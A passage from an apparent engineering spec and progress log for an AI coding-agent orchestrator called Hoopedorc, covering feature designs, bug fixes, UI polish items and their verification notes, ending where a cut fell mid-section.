   - *security:* never hardcode secrets or tokens; validate and bound all
     external input (body, params, files); parameterized queries only; no
     `eval`/dynamic `require`; don't add dependencies for what stdlib does;
     don't log credentials.
2. **Validation:** `PUT /api/settings` caps each field (~4000 chars) —
   the bounded-prompt rule at the top of this Part.
3. **Author injection:** `buildAuthorPrompt` appends an
   `## Engineering standards` section: always `coding` + `security`; add
   `ux` when the task looks UI-flavored (`task.role === "frontend"` — keep
   the heuristic exactly that simple). Settings already reach the
   orchestrator via `SchedulerDeps.settings`.
4. **Validator injection:** the review prompt includes the same text and one
   instruction: flag clear violations of these standards as reasons (and
   `request_changes` when substantive), but do not nitpick style the
   standards don't mention.
5. **UI:** a "Guidelines" Settings section with three labeled textareas +
   the standard dirty/save handling (U4's machinery already covers it).
6. Per-project overrides are **out of scope** for this item (global only) —
   note it as a future hook rather than building unused plumbing.

**Acceptance:** engine unit test: `buildAuthorPrompt` output contains the
standards section (and `ux` only for frontend-role tasks) — export or
otherwise make it testable the way B12/B13 exported their pure helpers;
validator prompt contains the same text (unit test at the same altitude);
settings round-trip + cap enforced (400 past the cap); defaults visible in
Settings UI on a fresh DB.

### F29. Documentation guidelines for the docs-role model

**Owner's ask:** "Grok needs to produce better documentation of the
projects being created, create guidelines as a system prompt for grok to
create solid readme, changelog and any helper documentation files."

**Where:** `packages/engine/src/orchestrator.ts` (`buildAuthorPrompt`);
`packages/server/src/index.ts` (`buildDocsTaskDraft`, ~line 146); the
routing note: "Grok" here means *whatever model `routing.byRole.docs`
points at* — the mechanism is role-based, the owner routes it to Grok.

**Design:** same injection mechanism as F31 (build F31 first), one more
guidelines block that applies only to docs-role work — both the standing
"Project documentation" task every project gets and F30's per-task
documenter.

**Fix:**
1. **The guidelines text** (a `DOCS_GUIDELINES` const in the engine — not a
   Settings field; documentation standards are the product's opinion, and
   three editable textareas is already enough surface):
   - *README:* lead with what the project does and who it's for, in plain
     language; then quickstart (the exact commands, verified against
     `package.json` — never invent scripts), usage with a real example,
     configuration table, troubleshooting. No fabricated badges, links, or
     claims about features that don't exist yet — check the code before
     asserting.
   - *CHANGELOG:* Keep-a-Changelog shape (`## [version] - date`, grouped
     Added/Changed/Fixed), newest first; entries describe user-visible
     behavior, not commit messages.
   - *Helper docs:* create `docs/` files only when a topic outgrows the
     README (API reference, architecture); every doc says when it was last
     true; cross-link rather than duplicate.
2. **Injection:** `buildAuthorPrompt` appends `DOCS_GUIDELINES` when
   `task.role === "docs"` (alongside F31's blocks; a docs task gets coding +
   security + docs, which is correct — docs tasks still touch the repo).
3. **Beef up `buildDocsTaskDraft`:** the standing task's description and
   acceptance criteria should demand a CHANGELOG.md too ("CHANGELOG.md
   exists with an entry for the initial version") and reference the
   quickstart-commands-must-be-real rule.

**Acceptance:** unit test — a docs-role task's author prompt contains the
docs guidelines and a frontend task's doesn't; the standing docs task's
draft includes the CHANGELOG criterion; live-verify once on a scratch
project that the docs model actually produces a README following the
structure (eyeball, not automated).

### F30. Per-task documentation stage in the merge pipeline

**Owner's ask:** "Once the said task is verified by our validation agent,
each tasks in the kanban card will be documented by grok and then pushed
commit merged" — i.e. the verify → document → push/commit/merge workflow
this repo itself uses, applied to every task the orchestrator lands.

**Where:** `packages/engine/src/orchestrator.ts` `executeTask` — after the
attempts loop exits approved (past the `prNumber == null` guard, ~line 905)
and **before** `syncBranchWithMain`; `@orc/types` `ProjectConfig`;
`ProjectConfigFields.tsx`; CONTRACT.md.

**Design:** after the validator approves (including the approve_anyway /
escalate-approve paths), a documenter run executes in the *same worktree* so
its commit rides the *same PR* — branch → PR → merge stays sacred, and the
docs land atomically with the code they describe. The documenter is
docs-role-routed (`routing.byRole.updates ?? routing.byRole.docs`) and
scope-restricted to documentation files. It must be strictly best-effort: a
documentation failure never blocks a validated merge.

**Fix:**
1. **Config:** `ProjectConfig.perTaskDocs?: boolean`, **default true** (this
   is the owner's requested standard workflow; per-project off-switch for
   repos where it's noise). Validate on PATCH like the other booleans.
2. **The stage,** guarded by the toggle and by `bailIfStopRequested`:
   - Resolve the documenter model; if none is routed, warn-log and skip.
   - Prompt: the task's title/description/acceptance criteria, the attempt
     count and final model, plus instructions: inspect the branch's actual
     changes yourself (`git diff <defaultBranch>...HEAD --stat` and targeted
     diffs); update `CHANGELOG.md` (create it if absent) with an entry for
     this change; touch `README.md`/`docs/**` **only** if this change makes
     them wrong or incomplete; modify nothing else; follow `DOCS_GUIDELINES`
     (F29). Allowed files: `CHANGELOG.md`, `README.md`, `docs/**`.
   - Run it via `adapterFor` with its own AbortController + a hard timeout
     (5 min — docs, not a feature); reuse the `runAuthor` log-streaming
     shape (source `"agent"`, its own run id like `run-<taskId>-docs` so the
     cost and duration land in the runs/costs tables the same way author
     runs do — verify a cost row actually appears, since that path flows
     through `onRunUpdated`).
   - After it returns: if `changedFiles` shows edits **outside** the allowed
     doc paths, `git checkout --` them (revert), warn-log — the documenter
     never gets to change code. Then `commitAll("docs: <task title>")` +
     `push`. Zero changes → fine, continue silently.
   - Any error/timeout: warn-log, continue to merge. Never `requestApproval`
     for a docs failure.
3. **Ordering note:** gates already ran before the validator; the docs
   commit is deliberately not re-gated (it can't touch code — enforced
   above). F15's GitHub-checks gate, when enabled, naturally sees the docs
   commit since it runs after this stage — that's correct and worth a
   sentence in CONTRACT.md.
4. **Stuck-detector note (F15 precedent):** the wait happens inside an
   adapter run with live log streaming, so the Board heartbeat stays honest;
   no extra keepalive needed. Verify `STUCK_DETECTION` scoping doesn't apply
   outside `runAuthor` before assuming (it didn't for F15, but re-check —
   don't trust this paragraph over the code).

**Acceptance:** engine unit tests with a fake adapter: (a) documenter runs
after an `approve` verdict and before merge, and the task still ends `done`;
(b) documenter throwing/timing out → merge still proceeds, warn logged; (c)
`perTaskDocs: false` → no documenter call; (d) out-of-scope documenter edits
are reverted before commit. Live-verify once on a scratch project with a
real model: the merged PR contains a `docs:` commit with a sane CHANGELOG
entry.

### F32. Rate-limit wait-and-retry + fallback alerts on Telegram

**Owner's ask:** "agents might get timedout … or when the usage limit runs
out … add retries that pause the task and try again in a few minutes and
then a fallback agent like deepseek can try to complete the task if retries
doesn't work. I should get alerted in telegram in such cases."

**Where:** `packages/engine/src/orchestrator.ts` `executeTask` (the
`!authorResult.ok` branch, ~line 629); `packages/server/src/engine-runner.ts`
(notifier wiring; the F6 cooldown watcher ~line 356); `packages/server/src/
telegram.ts` (`ServerNotifier`); `@orc/types` `Settings.telegram`;
`Settings.tsx`.

**What exists already (don't rebuild it):** adapters classify rate-limited
failures (`exitReason: "rate_limited"`, F6); a rate-limited run puts the
model on a 5-minute *dispatch* cooldown so **new** tasks route around it
(F6); fallback chains already escalate the *in-flight* task to the next
model — with deepseek in the chain if routing says so (`buildFallbackChain`).
The two gaps: (1) an in-flight task currently falls back **immediately** on
a rate limit, burning a stronger model's slot on what's often a
five-minute wait; (2) nothing pings the owner when any of this happens.

**Fix:**
1. **Wait-and-retry, same model:** in the `!authorResult.ok` branch, when
   `exitReason === "rate_limited"` and the task has used fewer than
   `RATE_LIMIT_RETRIES` (const, 2) waits: emit a warn log, wait
   `RATE_LIMIT_WAIT_MS` (const, 5 min) in short (~5s) slices that check
   `this.paused` and `stopRequested` each slice (a Stop press mid-wait must
   bail immediately — same reasoning as F15's post-wait bail), bump
   `task.maxAttempts++` so the wait doesn't consume a real attempt, then
   `continue` **without** switching models. Track waits in a per-task
   counter cleaned up in the `finally` like the other per-task maps. Only
   `rate_limited` gets this treatment — `stuck`/`error` keep today's
   immediate-fallback behavior (a hung or crashing model won't be fixed by
   waiting; the misclassification risk runs the other way).
2. **Alerts:** new optional `SchedulerDeps.events.onModelTrouble?(info: {
   taskId; taskTitle; model; event: "rate_limit_wait" | "fallback" |
   "exhausted"; detail: string })`, called at: the *first* wait for a task
   (not every wait — one ping, not spam), every fallback switch (all of the
   existing `Switching to fallback model` sites — there are several;
   centralize into a tiny private helper while in there rather than
   five copy-pasted calls), and terminal failure with no fallback left.
   `EngineRunner` forwards to a new `ServerNotifier.modelTrouble(...)`
   Telegram message (short: project, task title, model, what happened, what
   the engine is doing about it) gated by a new
   `Settings.telegram.modelAlerts?: boolean`, **default true** (the owner
   asked for these explicitly; the off-switch is for later). Settings UI
   checkbox next to the existing digest control. `"exhausted"` also fires
   when the *task fails terminally* from the author-failure path even if
   Telegram's digest would already cover the failed status — the digest says
   *what*, this says *why*.
3. **Interplay notes:** the F6 dispatch cooldown is untouched and
   complementary. The known-and-accepted B19 escalation overshoot note
   still stands. Don't add waits to the opencode adapter's internal
   transient-startup retry — that's a different layer handling sub-second
   races, and it's fine.

**Acceptance:** engine unit tests with a fake adapter that fails
rate-limited N times then succeeds: (a) same model retried after the wait
(shrink the wait via an injected/overridable constant — don't sleep 5 real
minutes in CI), attempts budget not consumed by waits; (b) retries exhausted
→ falls back to the next model, `onModelTrouble` saw one `rate_limit_wait` +
one `fallback`; (c) Stop during the wait ends the task promptly with
nothing merged. Telegram side: verified with the scripted-fetch double (the
B8 technique) — the real bot needs the owner's token, mark it "verify on
your deployment".

### F33. Model test round-trip: show the model's own reply

**Owner's ask:** "we do a simple prompt such as 'Write the word hello and
your model name' and wait for a response like 'hello, my model is claude
sonnet 5' and show it to me the user so i can verify it works."

**Where:** `packages/server/src/setup.ts` `testModels` (~line 101);
`apps/web/src/pages/SetupView.tsx` (~line 224).

**What exists already:** `testModels` already runs a real prompt through
every enabled model via the real adapters and already returns `reply` —
and SetupView already renders it, truncated to 80 chars in a footnote style.
The gaps are the prompt (asks for "OK", proving liveness but not identity)
and the presentation.

**Fix:**
1. Prompt → `Say hello and state which AI model you are (name and version),
   in one short line.` Raise the reply capture from 80 → ~200 chars.
2. SetupView: make the reply the *primary* result line for a passing model
   (quoted, readable size), with cost/latency as the secondary caption —
   not the current fine-print footnote.
3. **Honesty note (put it in the UI copy, small):** models self-identify
   approximately — some report a family or an older base-model name rather
   than the marketing name the operator knows. The point of the check is
   "the wiring reaches a live model that answers as roughly the right
   family", corroborated by the cost/latency shown next to it; an exact
   name match is not promised. (This is why the old prompt asked for "OK" —
   keep the new copy from overclaiming.)

**Acceptance:** "Test models" on a live setup shows each model's actual
one-line self-description prominently; a deliberately mis-mapped model
(point an opencode id at the wrong provider) is visibly caught by its reply
or its error; mock mode unaffected.

### F34. Skills strategy: docs + per-project skill hints in prompts

**Current-runtime note (2026-07-23):** The bullets below preserve the behavior
verified when F34 shipped on 2026-07-08. Current Codex and OpenCode runtimes
support skills; F51 owns the runner-accurate correction in live documentation
and generated guidance.

**Owner's ask:** "Figure out a way to efficiently use skills in our
projects by the agents… It might be different in different projects. Or
some skills could be used for all agents in all projects. Im a bit confused
on that so we can figure it out together."

**The mechanics, stated plainly (this is the "figure it out" half):**
- **Skills are a Claude Code feature.** The `claude` runner discovers them
  from two places: `~/.claude/skills/` (user-level → every project on the
  box) and `<repo>/.claude/skills/` (committed to a repo → that project
  only, for anyone/anything running Claude Code in it). Discovery is
  automatic; *reliable* use is not — a headless agent uses a skill when the
  task at hand matches the skill's description, and the strongest lever is
  simply naming the skill in the prompt.
- **opencode models have no skills mechanism.** The equivalent lever is
  instructions text (their `AGENTS.md` convention, or just prompt content).
  So anything "skills" must degrade gracefully to plain prompt text.
- **Therefore the policy:** *universal* skills (things every project
  benefits from) belong at user level on the deployment box, installed
  once; *project-specific* skills belong in the target repo's
  `.claude/skills/`, committed like code; and Hoopedorc's job is just to
  **nudge**: tell the author model which skills matter for this project so
  it reaches for them instead of hoping discovery fires.

**Fix (deliberately small — the mechanism, not a skills marketplace):**
1. `ProjectConfig.skillHints?: string[]` — free-text lines, each "skill
   name — when to use it" (e.g. `frontend-design-guidelines — read before
   building any UI component`). Validate: array of strings, each ≤200
   chars, ≤20 entries (bounded-prompt rule).
2. `buildAuthorPrompt` appends an `## Skills` section when hints exist:
   "The following skills are available in this environment; invoke each
   when its condition applies:" + the lines. Sent to every runner —
   claude-code acts on it natively; for opencode it reads as ordinary
   (harmless, often still useful) instructions.
3. `ProjectConfigFields` Advanced accordion: a small textarea (one hint per
   line).
4. **Docs:** a "Using skills with your agents" section in USER_GUIDE.md
   covering the mechanics + policy above, including the one-time
   "install universal skills at user level on the EC2 box" step and the
   fact that skills only affect the `claude` runner.

**Acceptance:** unit test — hints appear in the author prompt, absent when
unset; guide section exists; live-verify once: a scratch project whose repo
has a trivial committed skill (e.g. one that makes the agent write a marker
file) plus a hint naming it → the marker appears in the agent's output/
worktree, proving the nudge → discovery → use chain end-to-end.

### F35. Quota usage in the Setup health panel

**Where:** `packages/server/src/setup.ts` / the health-panel data route
SetupView reads; `repo.getModelUsageSince` (exists since F16);
`SetupView.tsx`.

**Problem:** F16 enforces quotas invisibly — the operator can't see "how
much of my Claude window have I used" without hitting the wall.

**Fix:** for each model with a `quota` configured, include `windowUsage:
{ runs, costUsd, windowHours }` (one `getModelUsageSince` call) in the
health payload; SetupView renders "N runs / $X this window" (with the
`maxRuns`/`maxCostUsd` limits alongside, e.g. "3/50 runs") in the existing
per-model health row. No new table, no chart.

**Acceptance:** a model with a quota shows its current window usage in
Setup & Health; models without a quota show nothing new; the figures match
a hand-run of the F16 standalone-verification math (or the T1 test's
fixtures).

### What Part 6 deliberately does NOT include (for calibration)

- **F13 phase 1 (gates-only sandbox)** — explicitly deferred again, see the
  decisions block at the top of this Part. It should headline the next
  security-focused wave once the owner settles the Docker-on-EC2 question.
- **Per-project guideline overrides** (F31 is global-only) and **editable
  docs guidelines** (F29 ships as a product-opinion constant) — both are
  cheap later if real use demands them.
- **Service worker / push notifications** — unchanged from Part 5.
- **Automatic model-name assertion in F33** — the test shows the reply and
  lets the human judge; string-matching model self-IDs would fail honestly
  wired setups.

---

## Part 7 — Codex + agents-context + sandbox wave (Fable, 2026-07-08)

**Context for the implementing model.** Produced from three inputs: (1)
Fable's audit of the merged Phase 11 code (verdict below), (2) a full
design-critique walkthrough of the running app (every page, desktop, using
the design-taste review lens plus code scans), and (3) four owner decisions
made 2026-07-08: Codex CLI becomes an interchangeable alternative to Claude
Code (the owner holds a ChatGPT Plus/Pro subscription); the gates-only
sandbox ships THIS wave (the deploy target is a Linux EC2 box inside the
owner's tailnet — Linux keeps Claude Code auth in a plain file, so the
macOS-Keychain blocker that deferred F13 twice does not apply there); EC2
runs web/extension/server projects while Apple (Xcode) projects stay on the
owner's local Mac as a second instance; and the standing workflow continues
(this doc is the spec, Sonnet implements top-down, Fable re-verifies each
item post-merge — keep verification evidence in PR descriptions).

**Phase 11 audit verdict (all 13 items):** genuinely implemented; claims in
the Progress section held up against the merged code; all 113 tests green
(58 engine / 51 server / 4 adapters). B25/B26/B27 verified against
docs/`repo.getNotifications`' UNION shape/`update.sh`'s output-based check
respectively; F27's attachments module has the S-item-grade validation it
claims (basename → charset → leading-dot rejection → extension allowlist →
containment double-check → collision suffixing); F28 rewrites one session
file per DB-row lifecycle exactly as described; F32's wait-and-retry
compensates the attempt counter correctly, notifies once per task (not per
wait), and gates Telegram on `modelAlerts !== false` with the audit entry
unconditional. One defect found (B28 below) plus the UX findings folded
into U15–U18.

**Design-critique verdict:** the app passes the convergence test — a
coherent industrial/utilitarian dark dashboard with a single blue accent,
semantic amber/red/green, mono for identifiers, asymmetric layouts, and no
AI-slop signals (code scans clean: no pure `#000`, no `transition-all`, no
arbitrary spacing values). Findings are polish-level; **do not restyle
anything beyond the specific items below.** Design brief for any UI work in
this wave: direction *industrial/utilitarian dark* (keep); density
*compact*; surface *cards on near-black*; type *technical, mono for ids,
small-caps section labels*; motion *color transitions only*. Do: keep the
single blue accent + semantic colors, Title Case button labels, icons only
where they disambiguate. Don't: add gradients/glassmorphism, equalize
primary/destructive button weights, introduce new accent colors.

### B28. Removing/renaming a model leaves dangling routing/task references

**Where:** `packages/server/src/index.ts` (`PUT /api/settings` validation,
right after the existing self-review-collision check), `apps/web/src/
components/ModelsEditor.tsx`, `apps/web/src/pages/Settings.tsx`.

**Problem (confirmed against current code):** `ModelsEditor` lets you
remove a model (the ✕ button) or edit its `id` freely, and `PUT
/api/settings` validates self-review collisions and quota shapes but never
that `routing.planner`, `routing.byDifficulty.*`, `routing.byRole.*`, and
`routing.validatorByDifficulty.*` still reference model ids that exist in
`settings.models`. A dangling reference saves fine and only surfaces at
dispatch time, when `EngineRunner`'s `adapterFor` throws `no ModelConfig
for <id>` — the task dies with a cryptic `Fatal:` log. Existing tasks'
`assignedModel` can dangle the same way.

**Fix:**
1. Server: after the collision check, validate every routing reference
   resolves to a model in `merged.models`; 400 with a message naming both
   the reference and the missing id (e.g. `routing.byDifficulty.hard
   references "glm" which is not in models`). A dangling reference must be
   impossible to save, whichever side (models or routing) the user edited.
2. Server: in the same pass, reject duplicate model ids and empty ids —
   currently nothing stops two models sharing an id (`find` silently
   returns the first).
3. Tasks are rows, not settings — don't block the save over them. Instead,
   on a successful save, warn-log (server) any non-terminal task whose
   `assignedModel` no longer exists; at dispatch time this already fails,
   but ALSO make the dispatch/attempt path requeue-to-backlog with a clear
   log (`assigned model "<id>" no longer configured — reassign it`) instead
   of the current throw-to-Fatal, mirroring the budget/quota requeue shape.
4. UI: `ModelsEditor`'s ✕ asks for confirmation when the model is
   referenced by routing (pass routing down, or lift the check to
   Settings), naming what references it; Settings now also passes
   `roster` (from the existing `GET /api/setup/models`) so adding a model
   in Settings gets the same datalist the onboarding wizard already has —
   the machinery exists, it's just not wired here.
5. UI: add a one-line caption to the ROLES checkbox row clarifying that
   `hard`/`medium` are difficulty tiers (used by "Author by difficulty")
   while the rest are true roles — the current row silently mixes the two
   taxonomies.

**Acceptance:** unit/live: removing a routed model → 400 naming the
reference; duplicate ids → 400; a dispatch against a since-removed
`assignedModel` requeues to backlog with the clear log line (engine test);
Settings' model add shows the opencode datalist; removal of a referenced
model prompts before removing.

**B28 — done (PR [#91](https://github.com/IngeniousArtist/hoopedorc/pull/91)).**
`PUT /api/settings` now rejects duplicate/empty model ids and any routing
field (`planner`/`byDifficulty.*`/`byRole.*`/`validatorByDifficulty.*`)
naming a model not in `merged.models`, listing every offending reference in
one message. A successful save separately warn-logs (non-blocking — a task
is a row, not a setting) any non-terminal task whose `assignedModel` still
went dangling from that exact edit. `Orchestrator` gained two guards: the
dispatch loop's pre-existing (but silent-forever, non-deduped) "no
ModelConfig" check now requeues to `backlog` with a warn-once log via a new
`missingModelWarned` Set (mirroring `budgetBlockedWarned`'s exact shape);
the attempt loop gained a matching check on `currentModel` right before
`runAuthor` — this is the one that actually matters for the crash, since
manual dispatch (`runTask`) had no pre-check at all, and a fallback-chain
model can go dangling mid-task after the initial dispatch-time check
already passed. Both requeue to `backlog` and log `Assigned model "<id>" no
longer configured — reassign it` instead of letting `adapterFor`'s throw
surface as `Fatal:`. `ModelsEditor`'s ✕ now calls a new `routingReferences`
helper before removing and `window.confirm`s (naming every reference) only
when the model is actually routed; `Settings.tsx` fetches the real
`GET /api/setup/models` roster (previously only the onboarding wizard did)
and passes it down, so "+ Add model" gets the same datalist. Verified:
typecheck/build green across every workspace; `npm test -w @orc/adapters`
(4/4) and `-w @orc/server` (51/51) unaffected; `npm test -w @orc/engine`
**61/61 (3 new)** — a dangling-model task requeues to backlog with the
exact log line; the warn-once dedup holds across several ~250ms polls
while a second task keeps the loop alive (same two-task proof technique
F16/B18 established, since a single stuck task lets the loop exit after one
pass); manual `runTask` against a dangling model requeues to backlog and
never logs `Fatal:`. **Live-verified against a real running (non-mock)
server**: removing a routing-referenced model → 400 naming both
references exactly; a duplicate id → 400; an empty id → 400; a
routing-safe edit round-trips; rerouting away from a model then removing
it saves fine and the log shows the precise warn line for a real task (via
the app's own project/task-creation API) still pointed at it. **Live-
verified in a real browser** (`npm run mock`, the established
`window.confirm`-stub technique from U4's verification history since a
real native confirm blocks browser automation): clicking ✕ on a
routing-referenced model fires `confirm()` with the exact expected
message naming both references (`Author by difficulty → hard`,
`Role override → frontend`); returning `false` leaves the model in place,
returning `true` removes it and flips the dirty/"Unsaved changes" state;
clicking ✕ on an unreferenced model never invokes `confirm()` at all. The
roster datalist (`#opencode-model-roster`) rendered with 422 real ids
(a genuine `opencode models` call, not a stub) and every opencode-runner
row — including a freshly-added one — had its `list` attribute wired to it.

### B29. `ensureDeps` fingerprints the stale primary clone, not the merged worktree — MEDIUM (found live-verifying F36, 2026-07-08)

**Where:** `packages/engine/src/worktree-manager.ts`, `ensureDeps()`.

**Problem:** found by accident during F36's live verification, on a real
multi-task run (owner's `f36-livetest` scratch repo) — not specific to the
Codex runner; would reproduce identically with claude-code or opencode as
the author. A task that adds/changes dependencies (a scaffold task adding
real `test`/`build`/`lint`/`typecheck` scripts + devDependencies) merges
fine. But the *next* task's worktree — correctly branched off the freshly-
fetched `origin/<defaultBranch>` per `create()`'s own comment ("Always
branch off the latest remote default branch, not the primary clone's local
HEAD") — still fails those same gates for missing dependencies. Root cause:
`ensureDeps(project, worktreePath)` never reads `worktreePath` for its
dependency check at all — it fingerprints `project.localPath`'s (the
primary clone's) `package.json`/lockfile and runs `npm ci`/`install` there,
then symlinks the *worktree's* `node_modules` to the *primary clone's*.
Nothing in the codebase ever updates the primary clone's working files
after a merge (`create()`'s `git fetch` only updates the `origin/main` ref,
never the local branch or working tree) — so once the very first task
changes `package.json`, the primary clone is permanently stale and
`ensureDeps` compares against that stale snapshot forever, silently
symlinking every later worktree to an empty/outdated `node_modules`.

**Confirmed live:** after a real scaffold task's PR merged, the primary
clone's checked-out `package.json` was still the pre-scaffold stub (`git
log` showed local `main` one commit behind `origin/main`) and its
`node_modules` was empty. A same-difficulty follow-up task (any model)
would fail `typecheck`/`lint`/`build` gates indefinitely — not a flake, a
permanent state until something else happens to touch the lockfile in a
way that changes its hash relative to whatever stale copy is on disk.

**Fix (not attempted yet — scoping notes for whoever picks this up):**
`ensureDeps` needs to fingerprint and install against the *worktree's*
freshly-checked-out `package.json`/lockfile, not the primary clone's. The
shared-`node_modules`-symlink optimization can stay (still worth avoiding a
per-task reinstall), but the fingerprint comparison and the `npm ci`
working directory should point at something that reflects the latest
merged `main` — either read the worktree's own files for the fingerprint
while still installing into the shared primary-clone `node_modules`
directory, or `git fetch` + reset the primary clone's working tree (not
just the ref) before computing the fingerprint. Watch out for the existing
concurrency caveat in the comment above `ensureDeps` (concurrent worktrees
share one `node_modules`) — whatever fix lands must not reintroduce a race
between two sibling tasks' installs.

**Acceptance:** a task that adds a dependency, merged, followed by a
second task (different task, same or different model) whose gates need
that dependency — the second task's gates see the real installed package,
not a stale/empty `node_modules`. Add an engine test: two sequential
worktree creations against a project whose `package.json` changes on disk
between them (simulating a merge) — `ensureDeps` reinstalls for the second
one instead of silently reusing the first's stale marker.

### U15. Approve/reject buttons are visually identical on Notifications

**Where:** `apps/web/src/pages/Notifications.tsx` (options rendering).

**Problem:** the single most consequential control in the app — approving a
code merge — renders `approve` and `reject` as two identical solid-blue
buttons, lowercase, with zero weight distinction. A phone user tapping
quickly gets no visual guardrail. (Telegram's inline buttons have the same
labels but that's Telegram's own chrome — this is ours.)

**Fix:** approve keeps the solid blue primary treatment; reject becomes the
established secondary/destructive treatment already used elsewhere
(bordered, red text — same family as the Stop buttons). Title Case both
("Approve" / "Reject"), matching every other button in the app. Apply to
whatever renders the generic `options` array too (options other than
approve/reject keep the neutral secondary style; only the "positive
default" gets primary weight).

**Acceptance:** screenshot on the mock seed's pending approval: Approve
solid blue, Reject bordered red, Title Case; other pages' buttons
untouched.

### U16. Estimate copy duplication + fake-precision cost formatting

**Where:** `apps/web/src/pages/CostView.tsx` (estimate panel),
`apps/web/src/pages/PlanView.tsx` (planning-cost caption),
`apps/web/src/lib/format.ts` (`formatUsd` exists since U8).

**Problem (both confirmed on screen):** the estimate panel renders "Low
confidence: some models have no run history yet, so rough defaults were
used. **(low confidence)**" — the parenthetical repeats the sentence's
first two words. And the per-task estimate ranges render 4-decimal
precision (`$0.2200–$0.6600`) directly under that low-confidence banner —
fake precision; U8 deliberately kept 4 decimals for *actual* micro-costs,
but an estimate RANGE is not a micro-cost. PlanView's header separately
shows `planning cost $0.0000` (raw 4-decimal format for a headline zero —
exactly what U8 fixed elsewhere).

**Fix:** drop the duplicated parenthetical (keep the sentence); format
estimate range endpoints with `formatUsd`; use `formatUsd` for PlanView's
planning-cost caption. Per-run/per-task actual-cost rows keep their
existing 4-decimal `usd()` treatment (U8's decision stands — this item is
about estimates and headlines only).

**Acceptance:** screenshots: estimate panel reads "…rough defaults were
used." once, ranges like `$0.22–$0.66`; PlanView shows `planning cost
$0.00` (or `$0.0012`-style only when genuinely sub-cent nonzero).

### U17. Projects-row orphan "·" + pause/stop icon inconsistency

**Where:** `apps/web/src/pages/ProjectsView.tsx` (row meta line),
`apps/web/src/components/ProjectHeader.tsx` + wherever `⏸`/`⏹` literals
appear (`grep -rn "⏸\|⏹" apps/web/src`).

**Problem (both on screen):** each Projects row renders a stray lone "·"
under the name when there's no schedule chip or other meta to join — a
separator with nothing to separate. And the stop-family controls are
iconed inconsistently: `⏸ Pause` (icon), `Stop now` (no icon), `⏹ Stop
all` (icon).

**Fix:** only render the meta line's separator between two present items
(or hide the line entirely when empty). Pick one icon convention for the
family and apply it everywhere the three appear (ProjectsView rows,
ProjectHeader, the top bar) — either all three get their icon or none do;
prefer icons since ⏸/⏹ genuinely disambiguate at a glance.

**Acceptance:** screenshot of a schedule-less project row with no orphan
dot; Pause/Stop now/Stop all share one convention across all surfaces.

### U18. Unknown hash silently ignored — URL and UI disagree

**Where:** `apps/web/src/App.tsx` (`onHashChange`, and the module-load
`initialHashState` path).

**Problem (confirmed live):** navigating an open tab to an unparseable
hash (e.g. `#/notifications` — notifications is project-scoped, so its
real hash is `#/p/<id>/notifications`) hits `parseHash` → null →
`onHashChange` returns early. The page keeps showing the previous view
while the address bar shows the bogus hash — URL and UI disagree until the
next real navigation.

**Fix:** when `parseHash` returns null in `onHashChange`, normalize the
hash back to the current state (`history.replaceState(null, "",
hashFor(page, selectedProjectId))`) instead of returning silently —
mirroring what the hash-sync effect already does on mount for an empty
hash. Don't touch the initial-load path (an invalid initial hash already
falls through to defaults, and the first hash-sync write replaces it).

**Acceptance:** with the app on Board, setting `location.hash =
"#/garbage"` snaps the hash back to the Board's canonical hash within a
tick; back/forward still work (the replaced entry doesn't grow the stack).

**U15–U18 — done (PR [#93](https://github.com/IngeniousArtist/hoopedorc/pull/93)).**
All four web-only; no engine/adapter/server changes, so the full test suite
(61/61 / 4/4 / 51/51) is unaffected by construction — verification is
entirely live/visual, matching the plan's own acceptance criteria for this
batch. **U15**: new `formatOptionLabel` (Notifications.tsx) Title-Cases an
option id (`approve_merge` → "Approve Merge"); the button's class is chosen
by `option.startsWith("approve")` — primary blue for anything approve-shaped,
the same bordered-red secondary style used everywhere else (ModelsEditor's
✕, TaskCard's Stop, PlanView's remove) for reject and anything else,
covering every real `options` array in the codebase (`["approve",
"reject"]`, `["approve_merge", "reject"]`, `["approve_anyway", "reject"]`,
`["reject"]`). **U16**: `CostView.tsx`'s estimate note is now colored
green/amber directly instead of appending a separate `(low/high confidence)`
fragment that literally repeated "low confidence" from the note's own
prose; both the header total and per-task ranges switched from the local
4-decimal `usd()` helper to the already-imported `formatUsd` — per-task/
per-run actual costs elsewhere on the page keep `usd()` unchanged, per U8.
`PlanView.tsx` needed a new `formatUsd` import for its own planning-cost
caption. **U17**: `⏸`/`⏹` added to `ProjectHeader.tsx`'s "Pause (finish
current)"/"Stop now" and `ProjectsView.tsx`'s "Stop now" — `ProjectsView`'s
own "⏸ Pause" and every surface's "▶ Start"/"▶ Resume" already had icons,
so this was purely additive, no icon removed anywhere. **U18**:
`onHashChange`'s early `return` on a failed `parseHash` became an
`else`-free `if (!parsed) { history.replaceState(...); return; }` writing
back the current page's own canonical hash. **Notable correction to this
batch's own originating spec**: the design-critique write-up (in #90)
described "each Projects row renders a stray lone `·` with nothing to
separate," but re-reading the code (`ProjectsView.tsx`'s `{p.localPath}`
line) and re-screenshotting the mock seed showed that character is the
literal `localPath` field value ("." — the seed project's real, dogfooded
path) rendering correctly, not a separator artifact; a real project has a
real filesystem path there. No fix applied for that half of U17 — only the
icon-consistency half (verified above) was a genuine finding. **Live-
verified in a real browser** (`npm run mock`, fresh tabs throughout — a
reused tab from an earlier session hit a `window.confirm` left in a
dirty-Settings state from prior testing, freezing script injection with
"Script injection timed out" errors exactly as the browser tool's own
guidance warns about; closing that tab and opening a new one resolved it
immediately, a useful reminder for future sessions): Notifications shows
"Approve" solid blue / "Reject" bordered red, Title Case; Costs shows the
estimate note once in amber with `$0.85–$2.54` / `$0.22–$0.66`-style
ranges and no duplicated parenthetical; Projects/Board/ProjectHeader all
render `⏸ Pause` / `⏹ Stop now` consistently; and the U18 hash-repair was
proven two ways — a direct `location.hash = "#/garbage"` snapped back
within a tick, and a board→plan→garbage→back()→back() sequence reached
board in exactly two steps, the same count a garbage-free board→plan→
back() would need, proving the replaced entry added nothing to the stack.

### F36. Codex CLI as a first-class runner

**Owner's ask:** "I would like to have the option for codex to be set
instead of claude code, so i can interchange if needed."

**What exists:** `RunnerKind = "claude-code" | "opencode"`
(`packages/types/src/domain.ts`), `ClaudeAdapter`/`OpenCodeAdapter` +
`makeAdapter` (`packages/adapters/src/index.ts`), S5's `sanitizedEnv`
(`packages/adapters/src/env.ts`), setup checks (`packages/server/src/
setup.ts`), the ModelsEditor runner dropdown. Codex models are *already*
reachable via the opencode runner (`opencode/gpt-5.x-codex`, API-billed) —
this item is specifically about the **native Codex CLI** so the owner's
ChatGPT subscription's flat rate applies, exactly like `claude-code` is the
native path for the Claude subscription.

**Codex CLI facts (researched 2026-07-08 from developers.openai.com/codex —
RE-VERIFY against the installed CLI before writing code, the F15 rule; the
